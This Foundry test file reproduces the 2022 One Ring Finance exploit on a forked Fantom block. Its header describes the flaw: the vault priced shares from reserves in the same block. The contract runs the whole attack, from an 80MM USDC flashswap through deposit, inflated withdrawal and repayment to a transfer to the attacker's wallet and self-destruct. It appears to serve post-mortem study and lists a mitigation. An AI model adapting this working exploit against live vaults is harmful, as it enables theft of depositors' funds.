// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IUniswapV2Pair} from '../../utils/IUniswapV2Pair.sol';
import {IERC20} from '../../interfaces/IERC20.sol';

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_OneRingFinance -vvv
/*
On Mar 21, 2022 an attacker stole ~$1.55MM in USDC tokens from an One Ring Finance.

// Attack Overview
Total Lost: ~$1.55MM USDC
Attack Tx: https://ftmscan.com/tx/0xca8dd33850e29cf138c8382e17a19e77d7331b57c7a8451648788bbb26a70145

Exploited Contract: https://ftmscan.com/address/0x66a13cd7ea0ba9eb4c16d9951f410008f7be3a10#code
Attacker Address: https://ftmscan.com/address/0x12efed3512ea7b76f79bcde4a387216c7bce905e
Attacker Contract: https://ftmscan.com/address/0x6a6d593ed7458b8213fa71f1adc4a9e5fd0b5a58
Attack Block:  34041500

// Key Info Sources
Writeup: https://medium.com/oneringfinance/onering-finance-exploit-post-mortem-after-oshare-hack-602a529db99b


Principle: Price Oracle Manipulation
    Vault Implementation
    function _deposit(
        uint256 _amount,
        address _underlying,
        address _sender,
        uint256 _minAmount
    ) internal {
        require(_amount > 0, "Cannot deposit 0");
        require(
            underlyingEnabled[_underlying],
            "Underlying token is not enabled"
        );

        uint256 _sharePrice = getSharePrice();
        ...
    }

    function balanceWithInvested() public view returns (uint256 balance) {
        balance = IStrategy(activeStrategy).investedBalanceInUSD();
    }

    function getSharePrice() public view returns (uint256 _sharePrice) {
        _sharePrice = totalSupply() == 0
            ? underlyingUnit
            : underlyingUnit.mul(balanceWithInvested()).div(totalSupply());

        if (_sharePrice < underlyingUnit) {
            _sharePrice = underlyingUnit;
        }
    }

    function withdraw(uint256 _amount, address _underlying)
        internal
        returns (uint256)
    {
        // if slippage is not set, set it to 2 percent
        uint256 _sharePrice = getSharePrice();
        ...
    }

    Strategy Implementation
    function investedBalanceInUSD() public view returns (uint256 _balance) {
        uint256 _length = strategyInfo.length;
        for (uint256 _sid = 0; _sid < _length; _sid++) {
            _balance = _balance.add(
                IStrategy(strategyInfo[_sid].strategy).investedBalanceInUSD()
            );
        }
    }

ATTACK:
The price of the shares is retrieved by getting the amount of reserves held in the vault. No delays or weighted pricing was used.
The attacker manipulated the price by changing the amount of reserves on the same block of the attack increasing the price of each share.
1) Flashloans USDC
2) Deposits to mint shares
3) Withdraws shares for USDC
4) Repays loan and transfers stolen USDC

MITIGATIONS:
1) If there are no off-chain oracles that provide onchain data,
use timeweighted price feeds for token pairs or similar solutions that prevent price manipulation in the same block.

*/

interface IOneRingVault {
  function depositSafe(uint256 _amount, address _token, uint256 _minAmount) external;
  function withdraw(uint256 _amount, address _underlying) external;
  function balanceOf(address account) external view returns (uint256);
  function getSharePrice() external view returns(uint256);
}

interface ISolidlyPair is IUniswapV2Pair {}  // Essentially the same but for the callback selector.

contract Exploit_OneRingFinance is TestHarness, TokenBalanceTracker {
    ISolidlyPair pairUsdc_Mim = ISolidlyPair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IERC20 mim = IERC20(0x82f0B8B456c1A451378467398982d4834b6829c1);
    
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    uint256 borrowAmount;

    function setUp() external {
        cheat.createSelectFork('fantom', 34041499); // We pin one block before the exploit happened.

        cheat.deal(address(this), 0);

        addTokenToTracker(address(usdc));
        addTokenToTracker(address(vault));

        updateBalanceTracker(address(this));
        updateBalanceTracker(address(vault));
        updateBalanceTracker(tx.origin);
    }

    function test_attack() external {
        console.log('------- STEP 1: FLASHSWAP -------');  
        borrowAmount = 80_000_000 * 1e6; // Borrows 80MM USDC from the pool

        pairUsdc_Mim.swap(
            pairUsdc_Mim.token0() == address(usdc) ? borrowAmount : 0,
            pairUsdc_Mim.token0() == address(usdc) ? 0 : borrowAmount,
            address(this),
            abi.encode("0xdeadbeef") // trigger the loan by sending arbitrary data
        );


    }
    // Essentially the same as uniswapV2Call, the flashswap callback.
     function hook(address sender, uint , uint , bytes calldata ) external{
        require(sender == address(this), 'Not requested by this');
        require(msg.sender == address(pairUsdc_Mim), 'Not requested by pair');
        
        console.log('------- STEP 2: INSIDE FLASHSWAP CALLBACK -------');  
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Vault', address(vault));
        console.log('Retrieved price: ', vault.getSharePrice());
        console.log('\n');

        console.log('------- STEP 3: DEPOSIT USDC -------');  
        
        usdc.approve(address(vault), type(uint256).max);
        vault.depositSafe(borrowAmount, address(usdc), 1);
        
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Vault', address(vault));
        console.log('Retrieved price: ', vault.getSharePrice());
        console.log('\n');


        console.log('------- STEP 4: WITHDRAW -------');  
        vault.withdraw(vault.balanceOf(address(this)),address(usdc));
        
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Vault', address(vault));
        console.log('Retrieved price: ', vault.getSharePrice());
        console.log('\n');

        console.log('------- STEP 5: REPAY LOAN -------');  
        usdc.transfer(address(pairUsdc_Mim),(borrowAmount/9999*10000)+10000);

        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Vault', address(vault));
        console.log('Retrieved price: ', vault.getSharePrice());
        console.log('\n');
        
        console.log('------- STEP 6: SEND FUNDS TO EOA -------');
        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Attacker EOA', tx.origin);
        logBalancesWithLabel('Vault', address(vault));

        console.log('------- STEP 7: SELFDESTRUCTS CONTRACT -------');  
        selfdestruct(payable(tx.origin));
    }
}